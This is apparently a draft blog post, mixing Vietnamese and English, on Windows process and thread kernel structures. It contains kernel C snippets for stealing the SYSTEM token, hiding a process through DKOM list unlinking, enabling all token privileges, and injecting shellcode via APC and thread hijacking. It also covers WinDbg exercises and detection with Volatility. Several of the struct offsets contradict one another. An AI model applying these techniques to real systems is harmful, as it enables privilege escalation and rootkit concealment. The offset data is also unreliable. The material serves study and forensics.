---
title: "Windows Process & Thread Internals: EPROCESS, KTHREAD & Exploitation"
published: 2025-10-12
description: "Deep dive vào Windows process và thread internals - EPROCESS/KTHREAD structures, token manipulation, DKOM techniques, và practical exploitation methods."
image: ""
tags: ["windows", "process-internals", "privilege-escalation", "dkom"]
category: "Cybersecurity"
draft: true
lang: "en"
---

## Giới thiệu

Processes và threads là fundamental building blocks của bất kỳ operating system nào. Trong Windows, việc hiểu process/thread internals không chỉ critical cho system programming mà còn essential cho privilege escalation, process hiding, và token manipulation attacks.

Bài này deep dive vào kernel structures (`EPROCESS`, `KPROCESS`, `ETHREAD`, `KTHREAD`), process/thread creation flow, scheduler internals, và most importantly - practical exploitation techniques bao gồm token stealing, DKOM (Direct Kernel Object Manipulation), và process hiding.

### Tại sao Process/Thread Internals quan trọng?

**Đối với Privilege Escalation:**
- Token stealing/manipulation → SYSTEM privileges
- Process token duplication
- Impersonation attacks
- SeDebugPrivilege exploitation

**Đối với Rootkit Development:**
- Process hiding (DKOM techniques)
- Thread hiding
- Unlinking từ PsActiveProcessHead
- Callback manipulation

**Đối với Malware Analysis:**
- Understanding process injection
- Thread context analysis
- Detecting hidden processes
- Memory forensics

---

## Process Structures Overview

Windows kernel maintains process information trong multiple interconnected structures:

```
┌─────────────────────────────────────────────────┐
│            Process Structures                    │
├─────────────────────────────────────────────────┤
│                                                 │
│  ┌─────────────────────────────────────────┐  │
│  │         EPROCESS                        │  │
│  │  (Executive Process Block)              │  │
│  │                                         │  │
│  │  - Process ID (UniqueProcessId)        │  │
│  │  - Parent PID (InheritedFromUniqueProcessId) │
│  │  - Process name (ImageFileName)        │  │
│  │  - Token pointer                        │  │
│  │  - VAD root                             │  │
│  │  - Handle table                         │  │
│  │  - PEB pointer                          │  │
│  │  - Active process links                 │  │
│  │                                         │  │
│  │  ┌───────────────────────────────────┐ │  │
│  │  │      KPROCESS                     │ │  │
│  │  │  (Kernel Process Block)           │ │  │
│  │  │                                   │ │  │
│  │  │  - DirectoryTableBase (CR3)       │ │  │
│  │  │  - Process threads list           │ │  │
│  │  │  - Process priority               │ │  │
│  │  │  - Affinity mask                  │ │  │
│  │  └───────────────────────────────────┘ │  │
│  └─────────────────────────────────────────┘  │
│                                                 │
│  ┌─────────────────────────────────────────┐  │
│  │         PEB (User-mode)                 │  │
│  │  (Process Environment Block)            │  │
│  │                                         │  │
│  │  - Loaded modules (LDR)                 │  │
│  │  - Process parameters                   │  │
│  │  - Heap information                     │  │
│  └─────────────────────────────────────────┘  │
│                                                 │
└─────────────────────────────────────────────────┘
```

### EPROCESS Structure (Simplified)

```c
typedef struct _EPROCESS {
    KPROCESS Pcb;                           // +0x000 Kernel process block

    EX_PUSH_LOCK ProcessLock;               // +0x438 Process lock
    LARGE_INTEGER CreateTime;               // +0x440 Creation time
    LARGE_INTEGER ExitTime;                 // +0x448 Exit time

    EX_RUNDOWN_REF RundownProtect;          // +0x450

    HANDLE UniqueProcessId;                 // +0x440 Process ID (PID)
    LIST_ENTRY ActiveProcessLinks;          // +0x448 Doubly-linked list

    ULONG_PTR ProcessQuotaUsage[2];         // +0x460
    ULONG_PTR ProcessQuotaPeak[2];          // +0x470

    SIZE_T VirtualSize;                     // +0x490 Virtual size
    SIZE_T PeakVirtualSize;                 // +0x498

    ULONG_PTR NumberOfPrivatePages;         // +0x4A0

    LONG ModifiedPageCount;                 // +0x4A8

    union {
        struct {
            ULONG JobNotReallyActive  : 1;
            ULONG AccountingFolded    : 1;
            ULONG NewProcessReported  : 1;
            ULONG ExitProcessReported : 1;
            // ... more flags
        };
        ULONG Flags;
    } u1;

    ULONG_PTR CreateTime;                   // +0x4B0

    HANDLE InheritedFromUniqueProcessId;    // +0x550 Parent PID

    PVOID ObjectTable;                      // +0x570 Handle table

    PVOID Token;                            // +0x4B8 Process token (EX_FAST_REF)

    PMM_AVL_TABLE VadRoot;                  // +0x7D8 VAD tree root

    PVOID DeviceMap;                        // +0x670

    PVOID Session;                          // +0x678 Session pointer

    CHAR ImageFileName[15];                 // +0x5A8 Process name

    LIST_ENTRY JobLinks;                    // +0x5B8

    PVOID ThreadListHead;                   // +0x5E0 Head of thread list

    // ... many more fields (structure is ~0x800+ bytes)

} EPROCESS, *PEPROCESS;
```

> **Note:** EPROCESS structure size và field offsets thay đổi giữa Windows versions. Offsets ở đây là for Windows 10 x64. Always use symbols hoặc pattern matching để locate fields dynamically trong exploits.

### Key EPROCESS Fields cho Exploitation

**UniqueProcessId (PID):**
- Handle value representing process
- Used để identify processes
- PID enumeration attacks

**ActiveProcessLinks:**
- Doubly-linked list linking tất cả processes
- Used bởi `PsActiveProcessHead`
- **DKOM target**: Unlink để hide processes

**Token:**
- Points đến process access token (`EX_FAST_REF`)
- Contains security context (privileges, SIDs)
- **Primary exploitation target** cho privilege escalation

**ImageFileName:**
- 15-character process name
- Not full path, chỉ tên file
- Used bởi process enumeration tools

**InheritedFromUniqueProcessId:**
- Parent process ID
- Used để build process tree
- Forensics và detection

---

## Thread Structures Overview

Mỗi process chứa một hoặc nhiều threads. Thread structures tương tự process structures:

```
┌─────────────────────────────────────────────────┐
│            Thread Structures                     │
├─────────────────────────────────────────────────┤
│                                                 │
│  ┌─────────────────────────────────────────┐  │
│  │         ETHREAD                         │  │
│  │  (Executive Thread Block)               │  │
│  │                                         │  │
│  │  - Thread ID (Cid.UniqueThread)        │  │
│  │  - Process pointer (owning EPROCESS)    │  │
│  │  - Start address                        │  │
│  │  - Thread state                         │  │
│  │  - Priority                             │  │
│  │  - Impersonation token                  │  │
│  │                                         │  │
│  │  ┌───────────────────────────────────┐ │  │
│  │  │      KTHREAD                      │ │  │
│  │  │  (Kernel Thread Block)            │ │  │
│  │  │                                   │ │  │
│  │  │  - Thread context (registers)     │ │  │
│  │  │  - Kernel stack                   │ │  │
│  │  │  - TEB pointer                    │ │  │
│  │  │  - Wait blocks                    │ │  │
│  │  │  - Scheduling info                │ │  │
│  │  └───────────────────────────────────┘ │  │
│  └─────────────────────────────────────────┘  │
│                                                 │
│  ┌─────────────────────────────────────────┐  │
│  │         TEB (User-mode)                 │  │
│  │  (Thread Environment Block)             │  │
│  │                                         │  │
│  │  - Thread ID                            │  │
│  │  - Last error code                      │  │
│  │  - Thread local storage (TLS)           │  │
│  │  - Stack base/limit                     │  │
│  └─────────────────────────────────────────┘  │
│                                                 │
└─────────────────────────────────────────────────┘
```

### ETHREAD Structure (Simplified)

```c
typedef struct _ETHREAD {
    KTHREAD Tcb;                            // +0x000 Kernel thread block

    LARGE_INTEGER CreateTime;               // +0x4B0 Thread creation time
    LARGE_INTEGER ExitTime;                 // +0x4B8 Thread exit time

    union {
        LIST_ENTRY LpcReplyChain;
        LIST_ENTRY KeyedWaitChain;
    };

    PVOID LpcReplyMessage;                  // +0x4D0

    ULONG LpcReplyMessageId;                // +0x4D8

    CLIENT_ID Cid;                          // +0x4E0 Client ID
    // Cid.UniqueProcess = Process ID
    // Cid.UniqueThread = Thread ID

    union {
        KSEMAPHORE LpcReplySemaphore;
        KSEMAPHORE KeyedWaitSemaphore;
    };

    PVOID LpcReplyMessageId;                // +0x500

    PVOID ImpersonationInfo;                // +0x4F8 Impersonation token

    LIST_ENTRY IrpList;                     // +0x508 Pending I/O requests

    ULONG_PTR TopLevelIrp;                  // +0x518

    PVOID Win32StartAddress;                // +0x520 Thread start address

    PEPROCESS ThreadsProcess;               // +0x550 Owning process

    PVOID StartAddress;                     // +0x640 Kernel start address

    // ... more fields

} ETHREAD, *PETHREAD;
```

### Key ETHREAD Fields

**Cid.UniqueThread:**
- Thread ID (TID)
- Unique identifier cho thread

**ThreadsProcess:**
- Pointer về owning EPROCESS
- Used để get process context từ thread

**Win32StartAddress:**
- User-mode start address của thread
- Visible trong Process Explorer
- Useful cho detecting injected threads

**ImpersonationInfo:**
- Points đến impersonation token (if any)
- Used cho impersonation attacks
- Can be different từ process token

---

## Process/Thread Creation Flow

Understanding creation flow giúp identify attack surfaces:

### Process Creation Steps

```
CreateProcess() [User-mode]
        ↓
NtCreateUserProcess() [Syscall transition]
        ↓
PspCreateProcess() [Kernel]
        ↓
    ┌───────────────────────────────────┐
    │ 1. Allocate EPROCESS structure    │
    │    - ExAllocatePoolWithTag()      │
    │    - Initialize fields            │
    └───────────────┬───────────────────┘
                    ↓
    ┌───────────────────────────────────┐
    │ 2. Create process address space   │
    │    - Allocate page directory (CR3)│
    │    - Setup VAD tree               │
    └───────────────┬───────────────────┘
                    ↓
    ┌───────────────────────────────────┐
    │ 3. Create process token           │
    │    - Duplicate parent token       │
    │    - Or create new token          │
    └───────────────┬───────────────────┘
                    ↓
    ┌───────────────────────────────────┐
    │ 4. Map executable image           │
    │    - Parse PE headers             │
    │    - Map sections                 │
    │    - Resolve imports              │
    └───────────────┬───────────────────┘
                    ↓
    ┌───────────────────────────────────┐
    │ 5. Create initial thread          │
    │    - PspCreateThread()            │
    │    - Setup thread context         │
    └───────────────┬───────────────────┘
                    ↓
    ┌───────────────────────────────────┐
    │ 6. Process callbacks              │
    │    - Notify registered callbacks  │
    │    - PsSetCreateProcessNotifyRoutine│
    └───────────────┬───────────────────┘
                    ↓
    ┌───────────────────────────────────┐
    │ 7. Insert into process list       │
    │    - Link vào PsActiveProcessHead │
    └───────────────────────────────────┘
```

### Thread Creation Steps

```
CreateThread() [User-mode]
        ↓
NtCreateThreadEx() [Syscall]
        ↓
PspCreateThread() [Kernel]
        ↓
    ┌───────────────────────────────────┐
    │ 1. Allocate ETHREAD structure     │
    │    - ExAllocatePoolWithTag()      │
    └───────────────┬───────────────────┘
                    ↓
    ┌───────────────────────────────────┐
    │ 2. Allocate kernel stack          │
    │    - Non-paged pool               │
    │    - Default: 12 KB (x64)         │
    └───────────────┬───────────────────┘
                    ↓
    ┌───────────────────────────────────┐
    │ 3. Initialize KTHREAD             │
    │    - Setup thread context         │
    │    - Set start address            │
    │    - Initialize registers         │
    └───────────────┬───────────────────┘
                    ↓
    ┌───────────────────────────────────┐
    │ 4. Allocate TEB (user-mode)       │
    │    - Thread Environment Block     │
    └───────────────┬───────────────────┘
                    ↓
    ┌───────────────────────────────────┐
    │ 5. Thread callbacks               │
    │    - Notify registered callbacks  │
    │    - PsSetCreateThreadNotifyRoutine│
    └───────────────┬───────────────────┘
                    ↓
    ┌───────────────────────────────────┐
    │ 6. Insert into process thread list│
    │    - Ready for scheduling         │
    └───────────────────────────────────┘
```

---

## Token Structure & Manipulation

**Access tokens** chứa security context của process/thread. Đây là primary target cho privilege escalation.

### TOKEN Structure (Simplified)

```c
typedef struct _TOKEN {
    TOKEN_SOURCE TokenSource;               // Token source
    LUID TokenId;                           // Token ID
    LUID AuthenticationId;                  // Authentication ID (LUID)
    LUID ParentTokenId;                     // Parent token ID

    LARGE_INTEGER ExpirationTime;           // Expiration time

    LUID ModifiedId;                        // Modified ID

    TOKEN_TYPE TokenType;                   // Primary or Impersonation

    SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;

    ULONG DynamicCharged;
    ULONG DynamicAvailable;

    ULONG DefaultOwnerIndex;                // Default owner SID index

    PSID_AND_ATTRIBUTES UserAndGroups;      // User SID + group SIDs
    ULONG UserAndGroupCount;

    PSID_AND_ATTRIBUTES RestrictedSids;     // Restricted SIDs
    ULONG RestrictedSidCount;

    PVOID Privileges;                       // Privileges (LUID_AND_ATTRIBUTES)
    ULONG PrivilegeCount;

    LUID TokenId;                           // Token identifier

    ULONG SessionId;                        // Session ID

    // ... more fields

} TOKEN, *PTOKEN;
```

### Token Types

**Primary Token:**
- Associated với process
- Stored trong `EPROCESS.Token`
- Inherited từ parent process (usually)

**Impersonation Token:**
- Associated với thread
- Stored trong `ETHREAD.ImpersonationInfo`
- Allows thread to act as different user
- Used bởi services (e.g., IIS, SQL Server)

### Token Privileges

Common privileges critical cho exploitation:

| Privilege | Constant | Description |
|-----------|----------|-------------|
| SeDebugPrivilege | 20 | Debug programs |
| SeLoadDriverPrivilege | 10 | Load/unload drivers |
| SeTakeOwnershipPrivilege | 9 | Take ownership of files/objects |
| SeRestorePrivilege | 18 | Restore files/directories |
| SeBackupPrivilege | 17 | Backup files/directories |
| SeImpersonatePrivilege | 29 | Impersonate clients |
| SeAssignPrimaryTokenPrivilege | 3 | Replace process token |

---

## Practical Exploitation: Token Stealing

Token stealing là classic privilege escalation technique. Idea: replace current process token với SYSTEM token.

### Technique 1: Token Stealing via EPROCESS

**Step 1: Find SYSTEM process (PID 4)**

```c
PEPROCESS pSystemProcess = NULL;
NTSTATUS status;

// Method 1: Lookup by PID
status = PsLookupProcessByProcessId((HANDLE)4, &pSystemProcess);

// Method 2: Walk process list
PEPROCESS pCurrentProcess = PsGetCurrentProcess();
PLIST_ENTRY pListEntry = (PLIST_ENTRY)((PUCHAR)pCurrentProcess + ACTIVEPROCESSLINKS_OFFSET);
PLIST_ENTRY pHead = pListEntry;

do {
    PEPROCESS pProcess = (PEPROCESS)((PUCHAR)pListEntry - ACTIVEPROCESSLINKS_OFFSET);
    HANDLE pid = PsGetProcessId(pProcess);

    if ((ULONG_PTR)pid == 4) {
        pSystemProcess = pProcess;
        break;
    }

    pListEntry = pListEntry->Flink;
} while (pListEntry != pHead);
```

**Step 2: Get SYSTEM token**

```c
// EPROCESS.Token là một EX_FAST_REF structure
// Lower 4 bits là ref count, cần mask out

PVOID pSystemToken = *(PVOID*)((PUCHAR)pSystemProcess + TOKEN_OFFSET);
pSystemToken = (PVOID)((ULONG_PTR)pSystemToken & ~0xF); // Clear lower 4 bits
```

**Step 3: Replace current process token**

```c
PEPROCESS pCurrentProcess = PsGetCurrentProcess();
PVOID* pCurrentTokenPtr = (PVOID*)((PUCHAR)pCurrentProcess + TOKEN_OFFSET);

// Save old token (optional, for cleanup)
PVOID pOldToken = *pCurrentTokenPtr;

// Steal SYSTEM token
*pCurrentTokenPtr = pSystemToken;

// Current process giờ có SYSTEM privileges!
```

### Technique 2: Token Manipulation via PsReferencePrimaryToken

Cách sạch hơn sử dụng documented APIs:

```c
PACCESS_TOKEN pSystemToken = PsReferencePrimaryToken(pSystemProcess);
PACCESS_TOKEN pOldToken = PsReferencePrimaryToken(PsGetCurrentProcess());

// Replace token
PsDereferencePrimaryToken(pOldToken);
SeSetTokenForProcess(PsGetCurrentProcess(), pSystemToken);
PsDereferenceImpersonationToken(pSystemToken);
```

### Token Stealing Shellcode Example

Minimal shellcode cho token stealing:

```c
// Find SYSTEM EPROCESS
ULONG_PTR current = (ULONG_PTR)PsGetCurrentProcess();
ULONG_PTR system = current;

while (1) {
    PLIST_ENTRY list = (PLIST_ENTRY)(system + 0x448); // ActiveProcessLinks offset
    system = (ULONG_PTR)list->Flink - 0x448;

    HANDLE pid = *(HANDLE*)(system + 0x440); // UniqueProcessId offset
    if ((ULONG_PTR)pid == 4) break; // Found SYSTEM
}

// Steal token
ULONG_PTR systemToken = *(ULONG_PTR*)(system + 0x4B8); // Token offset
systemToken &= ~0xF; // Clear ref count bits

ULONG_PTR* currentToken = (ULONG_PTR*)(current + 0x4B8);
*currentToken = systemToken;
```

> **Note:** Offsets (`0x448`, `0x440`, `0x4B8`) vary by Windows version. Production exploits phải dynamically resolve offsets hoặc use pattern matching.

---

## DKOM (Direct Kernel Object Manipulation)

DKOM techniques directly manipulate kernel structures để achieve goals như hiding processes, elevating privileges, etc.

### Technique 1: Process Hiding - Unlinking từ ActiveProcessLinks

**Concept:** Remove process từ `PsActiveProcessHead` doubly-linked list.

```c
// Get current process
PEPROCESS pProcess = PsGetCurrentProcess();

// Get ActiveProcessLinks offset
PLIST_ENTRY pListEntry = (PLIST_ENTRY)((PUCHAR)pProcess + ACTIVEPROCESSLINKS_OFFSET);

// Unlink from list
pListEntry->Blink->Flink = pListEntry->Flink;
pListEntry->Flink->Blink = pListEntry->Blink;

// Point to self (optional, avoid crashes)
pListEntry->Flink = pListEntry;
pListEntry->Blink = pListEntry;
```

**Result:** Process hidden từ:
- Task Manager
- Process Explorer
- `PsGetProcessList()`
- Most user-mode enumeration tools

**Still visible trong:**
- Handle tables
- Threads still scheduled
- Memory forensics tools
- Advanced detection (kernel callbacks)

### Technique 2: Zero Out ImageFileName

Simple technique để obfuscate process name:

```c
PEPROCESS pProcess = PsGetCurrentProcess();
PUCHAR pImageFileName = (PUCHAR)pProcess + IMAGEFILENAME_OFFSET;

// Overwrite with spaces or nulls
RtlZeroMemory(pImageFileName, 15);
// Or
memset(pImageFileName, ' ', 15);
```

### Technique 3: Modify Token Privileges

Enable tất cả privileges trong token:

```c
typedef struct _SEP_TOKEN_PRIVILEGES {
    ULONG64 Present;    // Bitmap of present privileges
    ULONG64 Enabled;    // Bitmap of enabled privileges
    ULONG64 EnabledByDefault; // Bitmap of default enabled
} SEP_TOKEN_PRIVILEGES;

// Get token từ EPROCESS
PVOID pToken = *(PVOID*)((PUCHAR)pProcess + TOKEN_OFFSET);
pToken = (PVOID)((ULONG_PTR)pToken & ~0xF);

// Offset của Privileges structure trong TOKEN
SEP_TOKEN_PRIVILEGES* pPrivileges = (SEP_TOKEN_PRIVILEGES*)((PUCHAR)pToken + PRIVILEGES_OFFSET);

// Enable all privileges
pPrivileges->Enabled = pPrivileges->Present;
```

---

## Thread Injection & Manipulation

### Technique 1: APC (Asynchronous Procedure Call) Injection

Inject code vào target thread qua user-mode APC:

```c
// Allocate memory trong target process
PVOID pRemoteCode = NULL;
SIZE_T codeSize = sizeof(shellcode);

ZwAllocateVirtualMemory(
    hTargetProcess,
    &pRemoteCode,
    0,
    &codeSize,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
);

// Write shellcode
ZwWriteVirtualMemory(
    hTargetProcess,
    pRemoteCode,
    shellcode,
    sizeof(shellcode),
    NULL
);

// Queue user-mode APC
PETHREAD pThread = ...; // Get target thread
KeInitializeApc(
    &apc,
    pThread,
    OriginalApcEnvironment,
    KernelRoutine,
    RundownRoutine,
    NormalRoutine,      // Points to shellcode
    UserMode,
    NormalContext
);

KeInsertQueueApc(&apc, NULL, NULL, IO_NO_INCREMENT);
```

### Technique 2: Thread Context Manipulation

Hijack existing thread bằng cách modify context:

```c
PETHREAD pThread = ...; // Target thread
PKTRAP_FRAME pTrapFrame = (PKTRAP_FRAME)((PUCHAR)pThread + TRAPFRAME_OFFSET);

// Suspend thread
PsSuspendThread(pThread, NULL);

// Modify RIP to point to shellcode
pTrapFrame->Rip = (ULONG64)shellcodeAddress;

// Modify stack pointer if needed
pTrapFrame->Rsp = newStackPointer;

// Resume thread
PsResumeThread(pThread, NULL);
```

---

## Lab Exercises với WinDbg

### Exercise 1: Enumerate Processes

```
kd> !process 0 0
**** NT ACTIVE PROCESS DUMP ****
PROCESS fffffa8000000000
    SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
    DirBase: 001a7000  ObjectTable: fffff8a000001000  HandleCount: 1234.
    Image: System

PROCESS fffffa8012345678
    SessionId: 1  Cid: 1a2c    Peb: 7fffffde000  ParentCid: 09b4
    DirBase: 6d8a9000  ObjectTable: fffff8a001234567  HandleCount: 234.
    Image: explorer.exe
```

### Exercise 2: Examine EPROCESS Structure

```
kd> !process explorer.exe
PROCESS fffffa8012345678
    SessionId: 1  Cid: 1a2c    Peb: 7fffffde000  ParentCid: 09b4
    ...

kd> dt nt!_EPROCESS fffffa8012345678
   +0x000 Pcb              : _KPROCESS
   +0x438 ProcessLock      : _EX_PUSH_LOCK
   +0x440 UniqueProcessId  : 0x00001a2c  // PID
   +0x448 ActiveProcessLinks : _LIST_ENTRY
   +0x4b8 Token            : _EX_FAST_REF
   +0x5a8 ImageFileName    : [15]  "explorer.exe"

kd> dx -r1 ((nt!_EPROCESS *)0xfffffa8012345678)
```

### Exercise 3: Token Analysis

```
kd> !token fffffa8012345678
Token: fffff8a001234567
User: S-1-5-21-123456-789-1011-1000 (DESKTOP-ABC\User)
Groups:
 S-1-5-21-123456-789-1011-513 (DESKTOP-ABC\None)
 S-1-5-32-545 (BUILTIN\Users)
 S-1-1-0 (Everyone)
Privs:
 0x000000013 SeShutdownPrivilege           Attributes - Enabled
 0x000000017 SeChangeNotifyPrivilege       Attributes - Enabled Default
```

### Exercise 4: Find Token Offset Dynamically

```
kd> r $t0 = poi(nt!PsInitialSystemProcess)

kd> ? $t0
Evaluate expression: -8796090842232 = fffffa8000000000

kd> dt nt!_EPROCESS $t0 Token
   +0x4b8 Token : _EX_FAST_REF

kd> ? 0x4b8
Evaluate expression: 1208 = 00000000`000004b8
```

---

## Detection & Forensics

### Detecting DKOM Techniques

**Method 1: Cross-validate với PspCidTable**

```
# Process list từ ActiveProcessLinks
!process 0 0

# Process list từ Handle table
!handle 0 f Process

# Compare lists - missing entries = hidden processes
```

**Method 2: Scan memory cho EPROCESS tags**

```
kd> s -d 0 L?0xffffffffffffffff 0x50636f72  # 'Proc' pool tag
```

**Method 3: Check process callbacks**

```
kd> !filecache

kd> dt nt!_OBJECT_TYPE *(poi(nt!PsProcessType))
```

### Memory Forensics với Volatility

```bash
# List processes
volatility -f memory.dmp --profile=Win10x64 pslist

# Find hidden processes
volatility -f memory.dmp --profile=Win10x64 psscan

# Check for unlinked processes
volatility -f memory.dmp --profile=Win10x64 psxview

# Dump process token
volatility -f memory.dmp --profile=Win10x64 getsids -p 1234
```

---

## Modern Mitigations

### Protected Processes (PP) & PPL

**Protected Process Light (PPL):**
- Introduced trong Windows 8.1
- Prevents tampering từ non-protected processes
- Even Administrator cannot debug/inject

**Protection Levels:**
```c
typedef enum _PS_PROTECTED_TYPE {
    PsProtectedTypeNone = 0,
    PsProtectedTypeProtectedLight = 1,
    PsProtectedTypeProtected = 2
} PS_PROTECTED_TYPE;

typedef enum _PS_PROTECTED_SIGNER {
    PsProtectedSignerNone = 0,
    PsProtectedSignerAuthenticode,
    PsProtectedSignerCodeGen,
    PsProtectedSignerAntimalware,
    PsProtectedSignerLsa,
    PsProtectedSignerWindows,
    PsProtectedSignerWinTcb,
    PsProtectedSignerMax
} PS_PROTECTED_SIGNER;
```

**Bypass:** Kernel-mode code có thể still manipulate, nhưng requires disabling PatchGuard.

### Process/Thread Callbacks

Windows allows registration của callbacks cho process/thread events:

```c
// Register process callback
PsSetCreateProcessNotifyRoutineEx(
    ProcessNotifyCallback,
    FALSE  // Remove = FALSE (add callback)
);

VOID ProcessNotifyCallback(
    PEPROCESS Process,
    HANDLE ProcessId,
    PPS_CREATE_NOTIFY_INFO CreateInfo
) {
    if (CreateInfo != NULL) {
        // Process being created
        DbgPrint("Process created: %wZ\n", CreateInfo->ImageFileName);
    } else {
        // Process exiting
        DbgPrint("Process exiting: PID %d\n", ProcessId);
    }
}
```

**Security Use:** EDR/AV drivers register callbacks để monitor suspicious activity.

**Evasion:** Kernel rootkits có thể unregister callbacks hoặc patch callback array.

---

## Wrapup

Understanding Windows process và thread internals - từ `EPROCESS`/`ETHREAD` structures đến token manipulation và DKOM techniques - là absolutely critical cho kernel exploitation và rootkit development.

Key takeaways:

- **EPROCESS/ETHREAD structures** chứa tất cả process/thread metadata
- **Token stealing** là classic privilege escalation method
- **DKOM techniques** allow process hiding và object manipulation
- **ActiveProcessLinks unlinking** hides processes từ standard enumeration
- **Thread injection** enables code execution trong target processes
- **Modern mitigations** như PPL và callbacks make exploitation harder

Knowledge này forms foundation cho advanced Windows exploitation, rootkit development, và memory forensics.

---

## References

**Books:**
- **Windows Internals, Part 1** (Chapters 3-4: Processes & Threads) - Russinovich, Solomon, Ionescu
- **Rootkits: Subverting the Windows Kernel** - Greg Hoglund, James Butler
- **The Rootkit Arsenal** - Bill Blunden

**Papers:**
- "Token Kidnapping" - Cesar Cerrudo
- "DKOM (Direct Kernel Object Manipulation)" - Jamie Butler, Greg Hoglund
- "Bypassing Windows Kernel Security Mitigations" - Multiple authors

**Tools:**
- [Process Hacker](https://processhacker.sourceforge.io/) - Advanced process viewer
- [System Informer](https://github.com/winsiderss/systeminformer) - System exploration
- [Volatility](https://www.volatilityfoundation.org/) - Memory forensics framework

---

<h2><strong style="color: red;">Control the process, own the system.</strong></h2>
